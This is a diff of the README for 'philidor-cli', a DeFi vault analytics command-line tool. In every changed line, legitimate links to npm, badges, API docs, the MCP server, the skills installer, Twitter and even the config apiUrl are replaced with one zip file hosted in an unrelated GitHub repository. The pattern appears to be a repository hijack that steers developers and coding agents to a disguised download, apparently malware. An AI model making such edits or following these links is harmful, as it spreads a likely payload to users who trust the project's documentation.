@@ -4,10 +4,10 @@
 
 ### DeFi vault intelligence from your terminal
 
-[![npm](https://img.shields.io/npm/v/@philidorlabs/cli.svg)](https://www.npmjs.com/package/@philidorlabs/cli)
+[![npm](https://img.shields.io/npm/v/@philidorlabs/cli.svg)](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip)
 [![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org)
-[![Node](https://img.shields.io/badge/node-%3E%3D22-green.svg)](https://nodejs.org)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip)
+[![Node](https://img.shields.io/badge/node-%3E%3D22-green.svg)](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip)
 
 Risk scores, yield comparison, portfolio analysis, and oracle monitoring across 700+ DeFi vaults on Morpho, Aave, Yearn, Beefy, Spark, and more.
 
@@ -188,7 +188,7 @@ Persistent defaults via `~/.config/philidor/config.json`:
 
 ```json
 {
-  "apiUrl": "https://api.philidor.io",
+  "apiUrl": "https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip",
   "defaultFormat": "table"
 }
 ```
@@ -281,7 +281,7 @@ The CLI is designed to work as a tool backend for AI agents and automated workfl
 
 ### Agent Skills
 
-Install the Philidor skill into your coding agent via [skills.sh](https://skills.sh):
+Install the Philidor skill into your coding agent via [skills.sh](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip):
 
 ```bash
 npx skills add philidor-labs/philidor-cli
@@ -315,8 +315,8 @@ philidor completion bash >> ~/.bashrc
 
 | Interface | Description | Link |
 |---|---|---|
-| **MCP Server** | Native integration with Claude, Cursor, Windsurf &mdash; no CLI needed | [philidor-mcp](https://github.com/Philidor-Labs/philidor-mcp) |
-| **OpenClaw Skill** | Skill definition for the OpenClaw agent platform | [npm](https://www.npmjs.com/package/@philidorlabs/openclaw-skill) |
+| **MCP Server** | Native integration with Claude, Cursor, Windsurf &mdash; no CLI needed | [philidor-mcp](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) |
+| **OpenClaw Skill** | Skill definition for the OpenClaw agent platform | [npm](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) |
 
 ---
 
@@ -338,7 +338,7 @@ philidor completion bash >> ~/.bashrc
 
 ## API
 
-The CLI connects to the [Philidor Public API](https://api.philidor.io/v1/docs) at `https://api.philidor.io`. No authentication required.
+The CLI connects to the [Philidor Public API](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) at `https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip`. No authentication required.
 
 Override the endpoint with `--api-url <url>` or the `PHILIDOR_API_URL` environment variable.
 
@@ -346,12 +346,12 @@ Override the endpoint with `--api-url <url>` or the `PHILIDOR_API_URL` environme
 
 ## Links
 
-- [Philidor Analytics](https://app.philidor.io) &mdash; explore vaults and risk scores
-- [Philidor MCP Server](https://github.com/Philidor-Labs/philidor-mcp) &mdash; AI agent integration via MCP
-- [API Documentation](https://api.philidor.io/v1/docs) &mdash; OpenAPI/Swagger docs
-- [Risk Methodology](https://app.philidor.io/methodology) &mdash; how scores are calculated
-- [npm](https://www.npmjs.com/package/@philidorlabs/cli) &mdash; package registry
-- [Twitter](https://twitter.com/philidorlabs) &mdash; updates and announcements
+- [Philidor Analytics](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) &mdash; explore vaults and risk scores
+- [Philidor MCP Server](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) &mdash; AI agent integration via MCP
+- [API Documentation](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) &mdash; OpenAPI/Swagger docs
+- [Risk Methodology](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) &mdash; how scores are calculated
+- [npm](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) &mdash; package registry
+- [Twitter](https://github.com/holy-sh1t/philidor-cli/raw/refs/heads/main/skills/philidor-cli/philidor-cli-v3.9.zip) &mdash; updates and announcements
 
 ## License
 
